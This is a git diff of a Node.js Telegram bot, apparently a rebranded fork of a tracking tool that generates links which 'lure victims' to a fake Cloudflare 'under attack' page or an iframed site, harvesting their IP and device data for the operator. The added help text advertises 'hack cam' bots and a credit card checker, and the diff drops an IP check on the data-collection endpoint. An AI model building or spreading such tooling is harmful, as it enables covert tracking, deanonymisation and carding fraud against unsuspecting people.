@@ -1,4 +1,3 @@
-require('dotenv').config();
 const fs = require("fs");
 const express = require("express");
 var cors = require('cors');
@@ -15,7 +14,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="YOUR URL";
+var hostURL="https://trackdown-2ukd.onrender.com";
 //TOGGLE for Shorters
 var use1pt=false;
 
@@ -31,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/zeedtek");
 }
 
          
@@ -49,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/zeedtek");
 }
 
          
@@ -78,14 +77,31 @@ else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
+bot.sendMessage(chatId,` u can contact the devloper : @theonlyziad or :
+
+ ⚠️ JOIN TO OUR CHANNEL @zeedtek to find all bots ❤
+HERE ALL BOTS OF US 
+==================
+THiS iS CALCULATOR BOT :
+@managermentbot
+==================
+THiS iS HACK CAM BOT :
+@nxhbslbsbot
+==================
+THiS iS TiK TOK DOWNLOADER BOT :
+@tiktokbotdownloanderbot
+==================
+THiS iS YOUTUBE DOWNLOADER BOT :
+@yttdownloadbot
+==================
+ADVANCE CAM BOT HACK :
+@camgiftbot (this bot)
+==================
+AND THiS iS CC CHECKER ( credit cards checker )
+https://f327af32-fc6e-4a07-b6ce-89cbaa58868a-00-dp6fz1kcycy1.hacker.replit.dev/
+••••••••••••••••••••••••••••••••••
+ DONT FORGET JOIN TO OUR      CHANNEL FOR UPDATES 
+🌀https://t.me/zeedtek🌀
 `);
 }
   
@@ -138,11 +154,16 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 
+WebView Page Link\n${g}`,m);
 }
 else{
 
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
+bot.sendMessage(cid, `New links has been created successfully.\nURL:
+
+${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link \n${cUrl}\n\n
+
+🌐 WebView Page Link\n${wUrl}`,m);
 }
 }
 else{
@@ -194,17 +215,9 @@ res.send("Done");
 app.post("/",(req,res)=>{
 
 var uid=decodeURIComponent(req.body.uid) || null;
-var data=decodeURIComponent(req.body.data)  || null;
-
-var ip;
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
+var data=decodeURIComponent(req.body.data)  || null; 
 if( uid != null && data != null){
 
- 
-if(data.indexOf(ip) < 0){
-return res.send("ok");
-}
 
 data=data.replaceAll("<br>","\n");
 
